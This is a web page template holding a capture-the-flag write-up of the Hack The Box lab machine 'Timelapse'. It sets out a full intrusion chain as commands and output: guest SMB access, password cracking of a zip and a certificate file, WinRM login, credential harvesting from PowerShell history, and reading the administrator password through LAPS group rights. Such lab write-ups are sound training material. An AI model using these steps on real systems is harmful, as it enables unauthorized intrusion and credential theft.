@@ -1,0 +1,245 @@
+{% load static %}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <link rel="stylesheet" href="{% static 'EthHack/css/machines/machines.css' %}">
+</head>
+<body>
+    <h1 class="title">HTB Timelapse</h1>
+    <p class="text">Difficulty : Easy | UserDifficulty : 3.9</p>
+
+
+    <h2 class="subtitle">Enumeration</h2>
+    <div class="code-box"><pre><code>└─$ <u>sudo nmap -p- -sCV $IP --min-rate=10000</u>
+PORT      STATE SERVICE           VERSION
+53/tcp    open  domain            Simple DNS Plus
+88/tcp    open  kerberos-sec      Microsoft Windows Kerberos (server time: 2025-11-07 10:41:13Z)
+135/tcp   open  msrpc             Microsoft Windows RPC
+139/tcp   open  netbios-ssn       Microsoft Windows netbios-ssn
+389/tcp   open  ldap              Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
+445/tcp   open  microsoft-ds?
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  ldapssl?
+3268/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
+3269/tcp  open  globalcatLDAPssl?
+5986/tcp  open  ssl/http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_ssl-date: 2025-11-07T10:42:48+00:00; +7h59m50s from scanner time.
+| tls-alpn: 
+|_  http/1.1
+| ssl-cert: Subject: commonName=dc01.timelapse.htb
+| Not valid before: 2021-10-25T14:05:29
+|_Not valid after:  2022-10-25T14:25:29
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+9389/tcp  open  mc-nmf            .NET Message Framing
+49667/tcp open  msrpc             Microsoft Windows RPC
+49673/tcp open  msrpc             Microsoft Windows RPC
+49674/tcp open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
+49687/tcp open  msrpc             Microsoft Windows RPC
+49696/tcp open  msrpc             Microsoft Windows RPC</code></pre></div>
+
+<p class="text">SMB is open on the target's server. Also we found domain name 'timelapse.htb'. Let's add this to /etc/hosts.</p>
+
+<div class="code-box"><pre><code>└─$ echo '$IP timelapse.htb' | sudo tee -a /etc/hosts</code></pre></div>
+<p class="text">Then, check if there is SMB shares we can read.</p>
+
+
+<div class="code-box"><pre><code>└─$ smbclient -L //timelapse.htb    
+Password for [WORKGROUP\kali]:
+
+        Sharename       Type      Comment
+        ---------       ----      -------
+        ADMIN$          Disk      Remote Admin
+        C$              Disk      Default share
+        IPC$            IPC       Remote IPC
+        NETLOGON        Disk      Logon server share 
+        Shares          Disk      
+        SYSVOL          Disk      Logon server share </code></pre></div>
+
+        <p class="text">Because I could list shares without providing password, we can enter the smbclient with guest user.</p>
+
+<div class="code-box"><pre><code>└─$ crackmapexec smb timelapse.htb -u guest -p '' --shares
+SMB         timelapse.htb   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:timelapse.htb) (signing:True) (SMBv1:False)
+SMB         timelapse.htb   445    DC01             [+] timelapse.htb\guest: 
+SMB         timelapse.htb   445    DC01             [+] Enumerated shares
+SMB         timelapse.htb   445    DC01             Share           Permissions     Remark
+SMB         timelapse.htb   445    DC01             -----           -----------     ------
+SMB         timelapse.htb   445    DC01             ADMIN$                          Remote Admin
+SMB         timelapse.htb   445    DC01             C$                              Default share                                                                                               
+SMB         timelapse.htb   445    DC01             IPC$            READ            Remote IPC
+SMB         timelapse.htb   445    DC01             NETLOGON                        Logon server share                                                                                          
+SMB         timelapse.htb   445    DC01             Shares          READ            
+SMB         timelapse.htb   445    DC01             SYSVOL                          Logon server share  </code></pre></div>
+
+
+<p class="text">We have read privilege for Shares. Becuase it's better to analyze shares on our local machine, I'll install them.</p>
+
+<div class="code-box"><pre><code>└─$ smbclient //timelapse.htb/Shares
+Password for [WORKGROUP\kali]:
+Try "help" to get a list of possible commands.
+smb: \> dir
+  .                                   D        0  Mon Oct 25 11:39:15 2021
+  ..                                  D        0  Mon Oct 25 11:39:15 2021
+  Dev                                 D        0  Mon Oct 25 15:40:06 2021
+  HelpDesk                            D        0  Mon Oct 25 11:48:42 2021
+
+                6367231 blocks of size 4096. 1335708 blocks available
+smb: \> RECURSE ON
+smb: \> PROMPT OFF
+smb: \> mget *</code></pre></div>
+
+<p class="text">Then we have the two dirs.</p>
+<div class="code-box"><pre><code>┌──(kali㉿kali)-[~/tempo]
+└─$ ls
+Dev  HelpDesk</code></pre></div>
+
+<p class="text">Under the Dev directory, I found winrm_backup.zip file. Since it requires password, let's crack it with john.</p>
+
+
+<div class="code-box"><pre><code>└─$ zip2john winrm_backup.zip > winrm_backup.zip.john
+└─$ john winrm_backup.zip.john --wordlist=/usr/share/wordlists/rockyou.txt
+winrm_backup.zip/legacyy_dev_auth.pfx:<u>supremelegacy</u></code></pre></div>
+
+<p class="text">We found password for the zip file 'supremelegacy'.</p>
+
+<div class="code-box"><pre><code>└─$ unzip winrm_backup.zip
+Archive:  winrm_backup.zip
+[winrm_backup.zip] legacyy_dev_auth.pfx password: 
+inflating: legacyy_dev_auth.pfx</code></pre></div>
+
+<p class="text">We got pfx file. <u>A .pfx file is a password-protected archive that bundles a digital certificate, its corresponding private key, and the certificate chain into a single file</u>.</p>
+<p class="text">This inflated file legacyy_dev_auth.pfx also requires password and I couldn't use password we found. Let's crack this file again.</p>
+
+<div class="code-box"><pre><code>pfx2john legacyy_dev_auth.pfx > pfx.john
+└─$ john pfx.john --wordlist=/usr/share/wordlists/rockyou.txt
+legacyy_dev_auth.pfx:thuglegacy</code></pre></div>
+
+<p class="text">Then, we can extact key files with openssl.</p>
+<div class="code-box"><pre><code>openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out key.pem -nodes
+openssl pkcs12 -in legacyy_dev_auth.pfx -nokeys -out cert.pem</code></pre></div>
+
+<p class="text">We can use them to login to the target machine.</p>
+<div class="code-box"><pre><code>└─$ evil-winrm -i 10.129.28.243 -k key.pem -c cert.pem -S
+                                        
+Evil-WinRM shell v3.7
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline                                                                
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                                                                           
+                                        
+Warning: SSL enabled
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\legacyy\Documents> </code></pre></div>
+
+
+
+
+<h2 class="subtitle">Lateral Movement</h2>
+<p class="text">Searching history file should be one of routine work when you want to find attack vector. </p>
+<div class="code-box"><pre><code>*Evil-WinRM* PS C:\Users\legacyy\Documents> (Get-PSReadlineOption).HistorySavePath
+C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ServerRemoteHost_history.txt</code></pre></div>
+<p class="text">We found text file.</p>
+
+
+<div class="code-box"><pre><code>*Evil-WinRM* PS C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine> type ConsoleHost_history.txt
+whoami
+ipconfig /all
+netstat -ano |select-string LIST
+$so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck
+$p = ConvertTo-SecureString '<u>E3R$Q62^12p7PLlC%KWaxuaV</u>' -AsPlainText -Force
+$c = New-Object System.Management.Automation.PSCredential ('<u>svc_deploy</u>', $p)
+invoke-command -computername localhost -credential $c -port 5986 -usessl -
+SessionOption $so -scriptblock {whoami}
+get-aduser -filter * -properties *
+exit</code></pre></div>
+
+<p class="text">We got new credentials. Let's change interacting user using this cred.</p>
+
+
+<div class="code-box"><pre><code>└─$ evil-winrm -i 10.129.28.243 -u svc_deploy -p 'E3R$Q62^12p7PLlC%KWaxuaV' -S          
+                                        
+Evil-WinRM shell v3.7
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline                                                                
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                                                                           
+                                        
+Warning: SSL enabled
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\svc_deploy\Documents> </code></pre></div>
+
+<p class="text">We successfully get powershell with svc_deploy user.</p>
+
+
+
+<h2 class="subtitle">PrivEsc</h2>
+<div class="code-box"><pre><code>*Evil-WinRM* PS C:\Users\svc_deploy\Documents> net user svc_deploy
+User name                    svc_deploy
+Full Name                    svc_deploy
+Comment
+User's comment
+Country/region code          000 (System Default)
+Account active               Yes
+Account expires              Never
+
+Password last set            10/25/2021 11:12:37 AM
+Password expires             Never
+Password changeable          10/26/2021 11:12:37 AM
+Password required            Yes
+User may change password     Yes
+
+Workstations allowed         All
+Logon script
+User profile
+Home directory
+Last logon                   11/7/2025 3:17:25 AM
+
+Logon hours allowed          All
+
+Local Group Memberships      *Remote Management Use
+Global Group memberships     *LAPS_Readers         *Domain Users
+The command completed successfully.</code></pre></div>
+
+<p class="text">We have LAPS_Readers membership.</p>
+<p class="text"><u>LAPS, or Local Administrator Password Solution, is a Microsoft security tool that manages and secures local administrator account passwords on domain-joined computers</u>. </p>
+<p class="text">We can easily extract password with command below</p>
+<div class="code-box"><pre><code>*Evil-WinRM* PS C:\Users\svc_deploy\Documents> Get-ADComputer DC01 -property 'ms-mcs-admpwd'
+
+
+DistinguishedName : CN=DC01,OU=Domain Controllers,DC=timelapse,DC=htb
+DNSHostName       : dc01.timelapse.htb
+Enabled           : True
+ms-mcs-admpwd     : <u>L2bM(D}-U.8#2zva&3qwqW7C</u>
+Name              : DC01
+ObjectClass       : computer
+ObjectGUID        : 6e10b102-6936-41aa-bb98-bed624c9b98f
+SamAccountName    : DC01$
+SID               : S-1-5-21-671920749-559770252-3318990721-1000
+UserPrincipalName :</code></pre></div>
+
+<p class="text">We can switch to Admin user again.</p>
+
+<div class="code-box"><pre><code>└─$ evil-winrm -i 10.129.28.243 -u administrator -p 'L2bM(D}-U.8#2zva&3qwqW7C' -S
+                                        
+Evil-WinRM shell v3.7
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline                                                                
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                                                                           
+                                        
+Warning: SSL enabled
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
+timelapse\administrator</code></pre></div>
+
+
+
+</body>
+</html>
